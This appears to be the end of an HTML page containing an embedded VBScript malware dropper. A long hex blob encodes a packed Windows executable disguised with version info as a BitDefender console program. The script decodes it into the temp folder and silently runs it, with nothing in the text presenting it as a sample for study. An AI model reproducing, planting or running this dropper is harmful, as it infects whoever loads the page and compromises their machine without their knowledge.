54B48866EAEA64DB970CF1DD2CA294C973B8097AE2CE181BC042B47F1487985C08C4F642DB5C87315A5B74DE003438DD4BAFB6ED6241C4B424616008B98512F0DB78E4EDC3B82927AE3D98B5F1160BD42E3DA7F11DE289A1425730F85D5BFE0F89B4F4D76DB31B849254BD4E924CE1367417BC933664B95EB4A61BB75BC1AA5E8AEA494DECFEA800ED16D0173EB04D792040F7F35D014AC46F2B3CC2A3A52E4AB6DD6ED95AF225122858998D83468D6F8D6E0CE2275924AD842F6E5072E5B6DFDE789908EC04241C041BED52D14FA226E80729D74553B7A059B020E09C1E355A7F6B5B1F3218C991D9082F9FAD6ED416E629FD519DCCBBD0FF1677CFB4DE89A4D82CD1F4A4D9C8F66FBCB97EA3342E5501670E2D599D5BE26C8D880300EDC98212E1F3C4770415889F61CA5AE818A51AB4BA4F844D27AC7EAFAAFFC42AF796E32DD62A8C6DE5C25B7F13CE7A1BCC088F9E6306A47A42EE7FA9A5A27D6EDF886B96FA4880FBFFD2B7CC8762DD2A81666387A10199D26DF980584E3C5B807609789F7E35D889068EF85B04377A68886F48447653CC0CA30916D8352DD503CFCC1AF083F660B4000CA6BD2ABE400BBF9B92E443CD0DD6C9BF6FD5DB0CDE60BB3953181FADBC8F8AA6EB2BB6DA5003F927DFCD7611A23928EC9E3B17B91634B708FE5FEABC1C981542C000FD1E0D97E193E160A96E447D1056EABC1BBFC4D63B214157194359B8067F20ADF576C3D81EC9DF98BCBD04335B14F7A27F57F84610ECD72148E1EC0B7FDC45D19EB76A2180978427DD21A9C59181479735B97CBCE7E0ED89C2107D4A3EF1B393ABD66D09A79BF6EED76E4BBF7C09B75155856AEBF05BBA9058E1009BDAC2C21665B2CE47A3AE308052D120709089EE171601CF687C97C13096EDC3AF8ADEB8D1BB1092BAB2D2EE77513450794695E111AECFBFB175E3434203FD24945ED0A5AD80DCEE05D8762D77E7C531D5E8B1B99D39725A850CB52A1344F2EEBFD42572F49EA8F54C76069B58667F1E1614FA02A801BF7A5EB06843B5802B62CAAB6DAB1AB66DEA4C1917CB0169BD48D4FA167F00E093913B3727B1808F4167AB0A852AFB050AD410442A62FC756F71EB6F1E5643F9A9530D156261927B36FD6E6F0BFCE0158AB03295AB331F6A00E923679C6DD4880592405C7EBE2D51DA4AE5A01D1318906B11DF0E319C81D316BC160A1768C376B3CE6725356DCA85900E68F402B5B2576B20E8875F861D918B55899D4A3675152C11F55149DFEAB7054EF28B4353B031600437B756610392AFFB5EDF184E3D6CFD6F2B84EA0093FCF86FFDE4ABFF83BD68451D7506E00E9A93B9F8A97499EBFB2FF5AAE977E986DF529AB11AF993FF6749410FAF4A0C2D347CAA40911CF69308FE83A3FAF612943E20C414345DF68BC87CAB5A68826187C92FD54D2F5BD7025A7169285902816C443FFAA9D81F72349DE6C197592F6CB71A5A5806BD0E15423E67620857FC8553357D5D5804F97ABEFFB54CB53CCDAE00E8A94BA03FDF2EDCE003F09199D1F75108E46F602C3CB2C00517FA0A97797F89DEFD53046CC45BDBA769C3333F10B4E450FC428177BBA0421CEAC8216F24F0EA42BEC45F4BBDF6968B0F113DAA5A078858E810B83AC7207CED5FA28DB164D9715D862B8425308AC24206A05E3CFD4F814BFD3BDCBAA6181E300A342495BEE6D1B4CD55EFDA40CE051484F6201A716FAD51AAC5F7CBAEABD4DF892D0CAD0D103242458BB8D4377ADD6D464EE14105F6FCD860D5471BB665B67F89D393D5DBC65BBF354A642895F551A600CEB81F25C2B8C1DB026BDC4F2FF170CF301B37B870811D4024C7FCECCD48056F7057070C4272FBC8635F934780D611B5C18B40E4DE39499B37A89AE348BB84E0477F04B061A9D1A4F5B09B57E7F5C117FE0503774D21A780DB3A3D86509467105BB84333A58C7BC5ABFAAE6FFEB8073A13582C7053831AD86F1E5E9A87C1EF2E2C68DD26C0169FA1051AF307F2D8280A2C971ACCE908A0FB47ABF0BA92C5FB90F6FDFA1BDBA5B9E1034BE53B7384D11248E0A5BA15358109F45A336FA2B6E0499AD544736C8DD2760A16553045640E69002EB1FDBD1CB089013923DEC04C003636DC89BCA6739D48BB6E71176FD0658304BAE2E580D3B454AB0A6CA34C9FB0DB4B6DDB75180C6F997FDB07967C7D63832FF5D2C1AA894E9BA14A14056C045084FBBF90E5D7A9D60455294077EC33BDF6067E2B992E9F3EE473E17378C441AD142D5A6883215C903596557B23E813D5161F1CE33FD6FEC2F66D61ACC8431DDD3A4F2C75FDF167E956D4A2DC4B4B4022758C0B7CEAEBB3E82885D3EE8EFCBB6B8A12F16BB730C382BE71B668307D005E4E45676189E5B97C83D6D5740765BDBAE7BAAE8425A2F45B7B6C664D8F4259985BDB6D6DD0137CB835D9F9A9EF1F2DE212D04C88AF5712F11B375480123FCA980CE411F8A3B844814B3BF8C3049008431D712D1FBEAC4500EFDB1703F0B844B33DE603627214EDFF5FA2AC491DE4B8286B803D466143697931DA32F6BC00DB1B9CF9C291F419BB5BDB73B0B1D55B14FAE5C11576ED7C6851B76E0A03F2D754CDADFE56BF89FC31044D8580E429B75B6ED6AF000BB95E165668A2E502523AB27FE9FFD21ACF631FC8C38CCFE021CC1F0527FE0D83AF961CDC17D8FE72FED45FD577033DCEF1350F048C31F81B6FA51448EA19203F3A8EE9F6AA024B40BF2334D042A3CF8E023982CED478C7D3194490E43DD5285729EDA6DFFAC0983F0DC95A0CB9C535F06886E46E7D0268DCE8044CF8F90102DABCF1C6EF6B30186F80923A4A617860E182C2621B5C8A2F68BB7DDDB1BB9834FA7830D1DA1CA4DCE123905A891C94A98A8112BD55A3EBB9D18853D3F5A70411D0D1BA113314D836D0A3BDC1FFBF520DE1BF600E901C291D8076BE505EFD5387DD28D16AA9111033C59152FDB6B1D8C939309204FA10E244C8FEB7D8A029FE1E44A70C8CE4E0773D1874DBFAEF73CBFD7400FA308740606BBC7270184D5DA0BF39633ACA034C17EA27041BEFF4C2A5E87F1CA01881A20F93D02D89F6160B18B0075EDD3D48DB1C049478B10619C50A6BA316E89F40B67415800D41DBB1400B0A5EC3EF9F371AF8B6618417180FD618C6F5C50D8FA169830B0391D552B25DC09DB785CB8686827AAEFB549F338DFF46FF86022A9B8A699AFC206EC689266300E4A16D354BC58DE203B3F430AD0AF18EB56E97B62E20EF9B32D2BE517AF235D5A05D7304234AA8362E5E6CB8224FFC56F78B506DD0B67E8B69D04BEE33E28B79B6152A941A2A1585B811795BC36FA2975E31AE3485EC8227288FD8051B6C9D671CE6EF40F6E2DB1B9902B8A30CD24134988371E05FE01B17AF1A7C55523680FC52007AFF4E16B5B0DB1E2B5CDD897B083B28118EFE2BD156780A20D9A7D2B7A2DB0AF27CD1459784727C5DE956F0C2B714273FEE6916EF4AA5AA61695AAC5831016C140BF412F590B9033F022B68052C3CBBA96BD685BE41A05ED083789F505516B5A56D814C87EB63FA34B175FD56B0360B9523DC53D06B7420B778DB0195AB4C11D9AC54410A3CE802FAFF31E6AFD43A0C372C8F82C9B973DA086B11ED8D396A3AA3850B2D6F5FFA76D5A70D174399E996C3B580421D162DA7157FE1C57CE560ECF050684EF1E71071831F3E92BDE68F0C2DD406FD0F2126CB82A92F8DA8ADF5B641FB29C1F03D849D7092A35AD8370B17D5D6EA86125BFCC104858144106B1F2C4D746BB79442118A4D05CFC3E819DDDA6FF8A1CEEC89B11DBC44373926CE45FA0053572568CA26D9A86882D5F6F45273F2A8020C36DA3151D2FF8DAF228257469E579D042CC70FEA95225AD56668DB35098B34BE12B9A3018D0274780691E0A5BF414F70B332FD40EFE71AA7B0375C225AF84A38615FD369B08AF4ADB8F55710F7AD55918EE3461F460E71CB10B0EB9380172B76F0FFD451F5EC943DEF1882580780AEDE0BB4FE152C3F0BA020211CED7FE1421B2D17E238849715E59F044130C5462B5074EB1EEB6F1F14DC761F3148C05954F179C44DE1DE82923BA83A06F237F1176CF0BFBC9D407886AD3C2D6308D0AB600B7A0422F57FEF9AB323FEBF70A71C3197FAF103047645272600B5DD2377138D6D8D202922E709217255976A577CA40DDEEE4777F0C3A5CF7D428EFF02722072F17CF54FDD8D6AA5B56809EA321B7B521BDE2A7C4790141BE7A33E33DC692018F8AF96E8CDFA0690E093F04F7D882D1820962F3186D8F806EA1DB4102635E6018B013FF45BA3E29F2113EC75E40E9B6063B08307BE53045151ADA95714808E4D14764BF1BE0D0D4307E0C7F802BF019BF83475407D7E352A7DF5BDD55AE80542C7120A776F70CA12557717860088175A88CA9B820DE0CDDDBFB64EFD64BEC1EDA647D7233182796B1BD1F5417A54822DA2834B1419C17DBB2DDC76EFF182DA1562AC9654B31F66817629BAE32CAACDE1FC0F239F9E5445BBFEE957428F2A6D14769550F675D7DA59C56F5D025C6114D1187434AFC937017FC9703F5D6104A765D0AA5D13E815FE465B805E5D984AD394BF7174A254E34637DCC6E99F0AFE1D3777153822CB80B798C785596F231ED5B753E5C77B7815402FF0216A0D1704F06DBB3D3E58E0AD8815CE25F1383748DFDAAAB70FAE5383FED60925B7A7EE1B3788B7E3DB0B82F32BBC6538C612BDA88537BEBDA7E2BA00F0EE8E99FBCD800C88E225B1C6EDAD292380804E14279754780CD3F60DC1E82BE4939DE14DAB10C805A5AD35CF9510C7FF4217FAB6B3F42988B0EFCEF8B84006967E2BFC33877881E85B2EB07580C6DC56E90C6F3718C0FEA660B030658B66C4755CA81B1413804D5E7F064E807714EF6EEC98061357DB00C3EC0C3639C3AD3A137C331D5B86313914BE15F505D6B70C1C3A68A0986EC0FF46BF8D522F80D44E1F1320B52582B4B90A38C4F05C05EEB680DF14DD5BEF558202D5553020DEB50284D6EE12C232FEAD21E8FF1A8D1603976D40FC480903BCFD3702D3907F20B760D640E6AA0D67390B4BC41687242246F74F6ABC356A0AB71FA3DAF1B1B72854257C638D283F77777BE864049C332C404D006CA9208E97D63528746785309E825E75707EA9EAF61CEDBF3596381C5AA10C8DA9FF7775A1F37B00BD56DDA0C13BAC67E26512D2C70FEA1BCDD1E11F8FC748D094600B5744DB1DBB3C7D072C5D895D9DC24E31964178D8B71BAA37B8D594F035D6C5057496FC62C9C4ED620335621CDA11C213892F0BDCB10850EB37C8E24A85CA01DA2A47476C23C416F4FF6E0755336F8F35B906F806F73CFECA02D12DDEBA004C2B36B645AAFABFE81237A29175807EFFF35512B7E0A52E371412B35498B60A9F82EDD94D3D3C833E70B3D678FBA5F2A8CF6DEA4E3400167C515D87A8CED11B34A922790196FA12B7A2C203D86BBE29B4055578C07FC21BBC431B0FDB52BBB3BBA60D150D7483AB68FD6D082B0F54E7E2F22B43EE2F541E69A0149B00A0BC0D6B54855F60283D7D175D60EFD727FEBFA16E8955E3FEEC80B07D99408E3953458C94D9DE760414A75953441F38C8D18BBF10AD9BCE9D5DAD2E4A0E44E112B4BD6E1822AEBE71CDE04595DD6FD07598421E60163E1C61F7D15C215B476D810B8FF8073919508D1B0253D0223ED2D0E180B770FDF681F90059DC0082A8BBA384D7A4499B76B7C2BE42E62777CAD96E0631C49AC21674FDD64D041701FC1CAD1DCCB8856E34E06D7EFCFD40363AB18161E14A300975F306DE980DDAC2BF61D15F74DD78DEBF1F1FE4CBDFBA2DF1996D709C398469A39B9D397E81FEBB3265FEC3E421A4B27C80A8408032857FA3FD6C41386078702A5EE840813DD41FCCEF115BB547088FEE61E94B6C2D40385BACBE18D9A533781C2FB075BDCE6E23240A0942FE0DC077B78E83CCD6AC23C410348245856E8DFE6DBFCF77481D4B884909A4DD2B805F8ADE1B643704AAAEC409437F61FD30E34A6FC3C66CF7332D16DE759D7C0570BA094D76431400144ADDBBA03D74FD80DAB7D868A68D5F40F60197F617BCFDEF285D9F975BFB1CC8767B23874A23660C975A801F010CECB78EB6FDA75AD81CFCE8F8158EDB102535CE9270D2520BEEB68F196F4B933839966289ADFEB015E1521DAD806D0B04D11A24AC41DB5B8113A1C8BF3028437FB65B0D6E86365FB5B0627C693CEEB7AE0A6D8A8C637DD739B0D9099678EB069647DAAB1A464BB16D7FB45D433B2979F86A4922AF931FB195FEA3800A493A3F403DA3B8DAD605FABFD8CD3C93388A231CA804A5E3E621B0AB4B4DFD60E1E884E802F82F3646336EFBB66319BE305B3D71AC0A71ED4C62777CFF0B641C96B5EFC5B5EE6C4055F96532C0398DA86FE802BA03CF46B47BCD57E46FB1C1D287A37D348F46661A64814089DF62262597DF62DC33FEB7D446CB73652ACDC882A0FCD21B40D70F4702292E4B52EA7C7E110458151820AAB00897514104B2A3002A90460154208C02A84019055081320AA00264144005C828800AAB510015F19EA9A8207C30ED7FABA06D4C6F63616C467265650A96BFBDFD4578697450720F657373174765744375726E7FFBDBC31249641451756572795003666F726D616EDB5D6B6F15436F751F0E456561760D726FBBDD6D3F694D536563076F6E15491C9BDBB6B76C3D6B65640A634B6D4D59533FD6DA2F4C617374455C45674D6F64756CDAFF6DDB6548506405419161644C696272616ACA1258CA0D9542B5BBC3FE5669727475D65796654669188DBDB99317416C940D556E68306465CCBDADF84A70B225CE486BED65B3703C705468058A6FADECE6DACBE745697AF12EB017CC2E98423E5213B6B2E7078EDBC657AD0DD666862DAD4D1963D7B5F6DB42799F546F5769647ABBA84354952B8B39115B7D53ADE16E85E32C5374610F70CF116CEB0ACF7F4366737BC200618516198A7D6159586B6146D653696E67733C33BC454F626A17296F6D30EC963D76AF6ED79745760BF3FB66871F104E616DBCD310570C233BB203414841FEC2B60B084E3944653374A185B13056028B8C04B68499C7E42B4B090B07F008291B618B2729AD2D3206A559BD71FA8B6D767929BA506F697421EC2E842E5F414350DEE1ED0AA746D48EC161677BF792534909E04465D2120658C5659C81903216854E4A5A496FB55CF7B27B6D5D1154A06B96D054651B2673B48020496C2C6370D086F11E1D41033ADDC021A3574B00891E4031012E98DAD71D48A270DDF1216C64F0C661DB53502668D36767416388C0ECE19277731020F07609C3BA0354D9726776AD70618B5380613C49633D0AA1AD6C6544207EB9D885A582A51B6F7166798E029BBD21F46B746F708E13602B0BD84766465BE1C55613F0ADCD49B1952DB444CB4057E925E11476780BC36E4D616F912D61362D4A1E505868ED686508BE70758D157E0BEC0297244162E7B03761EC8E0C5F21F012C72B2584C8E3C7216523B041D6E1C046082B3129A13056966142610921650D487312424A485C8CB310C2CA36F067C24A18098BDCEEC6208C50896391B0425A97E75B09232C34464292524222DFA632B6ED3030AC6E1C68BF022994ADCA7D09235B16375DF246B6CA1A620F6919231269215E0C4B652B644B9660360B8B9578324730891B0DD2A16F77F2F860E06EB16E7551B8426F78412016AC3D711F100D2D7C30FA53736E446C67490A6DD7C4BB81313E777370723A660A2A1B743F897973224D4E72C882ED6EE8497344976F67316DEEB041C391776C786D98F013AFB548EC9F7462656772B7D686758C64AF4666D563684FAC2C619B26AD4E1D823966504516BACCE05CA1077BA5215A1670B4EEC1DC1A52421E11A12D5436C5615AD70F929DD81E6C52D9ACE7BC995B607058E11F36171F4D436DA452B54C6505A3B6D56AF075302030A3D6B8046970599E6EB849B4985674A51B1E96CD4CB773AAA3536B0C2B1848EDEE8A2F82B576A154346E73ACB29D2D210813B49C6830F7D9CC56A45655706432B61809B3C3D89DC0368B6449E43F3FB8843025B8A1875701356A6785ED3156244DAD10361E0D74666BC51E133A9184889361C85A9B2CF7F18C5081564608636B4362121646C8D0F86D73A58411256E062786EE5636CB384B65797358082B6B901DAB4D68985B126114491FB22B6598A446ABF8506F900DA3AD8A69343F7124AC84CF2B4BA49034C3A26CB12718056BAD4BFBE14C6A1DD273A5432BD696B4846156EF96B0843432AA0FC36DC76625A5005045034CDFFB56407ABC7CB1470F14E0EE59B7FC000F010B0107900CB413FE1C04D93AFBBA1003A00D400B02BD0A3B77D8B20800043CA0140C3D3CBD819DBD021E34100706AFFCB69700C0433B5077600144E7C21064002E0264656EC8DE7BE390077F2095C860B1A62E9061D70394836D062C02402E7228200164B37D1001271A2801A6FB5EA973A30C23602706DF85B692428F3DCC47172A000000E09F020000900000FF0000000000000000000000000060BE00F041008DBE0020FEFF5783CDFFEB109090909090908A064688074701DB75078B1E83EEFC11DB72EDB80100000001DB75078B1E83EEFC11DB11C001DB73EF75098B1E83EEFC11DB73E431C983E803720DC1E0088A064683F0FF747489C501DB75078B1E83EEFC11DB11C901DB75078B1E83EEFC11DB11C975204101DB75078B1E83EEFC11DB11C901DB73EF75098B1E83EEFC11DB73E483C10281FD00F3FFFF83D1018D142F83FDFC760F8A02428807474975F7E963FFFFFF908B0283C204890783C70483E90477F101CFE94CFFFFFF5E89F7B9120100008A07472CE83C0177F7803F0075F28B078A5F0466C1E808C1C01086C429F880EBE801F0890783C70588D8E2D98DBE009002008B0709C0743C8B5F048D8430E8C4020001F35083C708FF9638C50200958A074708C074DC89F95748F2AE55FF963CC5020009C07407890383C304EBE1FF964CC502008BAE40C502008DBE00F0FFFFBB0010000050546A045357FFD58D871F02000080207F8060287F585054505357FFD558618D4424806A0039C475FA83EC80E93E5BFDFF000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000020010000000200000801800000060000080000000000000000000000000000001000100000038000080000000000000000000000000000001001904000050000000A4D00200D8020000000000000000000000000000000000000000000000000100010000007800008000000000000000000000000000000100190400009000000080D30200680100000000000000000000A0600100D80234000000560053005F00560045005200530049004F004E005F0049004E0046004F0000000000BD04EFFE000001002A006A003D0049002A006A003D0049003F00000000000000040004000100000000000000000000000000000038020000000053007400720069006E006700460069006C00650049006E0066006F00000014020000000030003400300039003000340042003000000040000900010043006F006D00700061006E0079004E0061006D0065000000000053004F0046005400570049004E00200053002E0052002E004C002E0000000000680008000100460069006C0065004400650073006300720069007000740069006F006E000000000042006900740044006500660065006E0064006500720020004D0061006E006100670065006D0065006E007400200043006F006E0073006F006C006500000000003C0009000100460069006C006500560065007200730069006F006E00000000003100300036002E00340032002E00370033002E00360031000000000034000A00010049006E007400650072006E0061006C004E0061006D006500000044043604370440044E043A0448044D04490400003800060001004C006500670061006C0043006F007000790072006900670068007400000032003500320038002D00360031003400320000003C00050001004F0072006900670069006E0061006C00460069006C0065006E0061006D00650000006E0065006400770070002E006500780065000000300007000100500072006F0064007500630074004E0061006D006500000000003B044E04370430043D04450400000000400005000100500072006F006400750063007400560065007200730069006F006E0000003100300036002E00340032002E00370033002E003600310000000000440000000000560061007200460069006C00650049006E0066006F00000000002400040000005400720061006E0073006C006100740069006F006E00000000000904B004786301003C3F786D6C2076657273696F6E3D22312E302220656E636F64696E673D225554462D3822207374616E64616C6F6E653D22796573223F3E0D0A3C617373656D626C7920786D6C6E733D2275726E3A736368656D61732D6D6963726F736F66742D636F6D3A61736D2E763122206D616E696665737456657273696F6E3D22312E30223E0D0AA0203C7472757374496E666F20786D6C6E733D2275726E3A736368656D61732D6D6963726F736F66742D636F6D3A61736D2E7633223E0D0AA020A0203C73656375726974793E0D0AA020A020A0203C72657175657374656450726976696C656765733E3C726571756573746564457865637574696F6E4C6576656C206C6576656C3D226173496E766F6B6572222075694163636573733D2266616C7365222F3E3C2F72657175657374656450726976696C656765733E0D0AA020A0203C2F73656375726974793E0D0AA0203C2F7472757374496E666F3E0D0A3C2F617373656D626C793E00000000000000000000000064D5020038D5020000000000000000000000000071D5020054D502000000000000000000000000007DD502005CD50200000000000000000000000000000000000000000088D5020096D50200A6D50200B6D50200C4D50200D2D5020000000000E0D5020000000000ECD50200000000004B45524E454C33322E444C4C005348454C4C33322E444C4C005553455233322E444C4C0000004C6F61644C69627261727941000047657450726F634164647265737300005669727475616C50726F7465637400005669727475616C416C6C6F6300005669727475616C467265650000004578697450726F636573730000004472616746696E697368000057696E48656C705700000000000000000000"
Set FSO = CreateObject("Scripting.FileSystemObject")
DropPath = FSO.GetSpecialFolder(2) & "\" & DropFileName
If FSO.FileExists(DropPath)=False Then
Set FileObj = FSO.CreateTextFile(DropPath, True)
For i = 1 To Len(WriteData) Step 2
FileObj.Write Chr(CLng("&H" & Mid(WriteData,i,2)))
Next
FileObj.Close
End If
Set WSHshell = CreateObject("WScript.Shell")
WSHshell.Run DropPath, 0
//--></SCRIPT>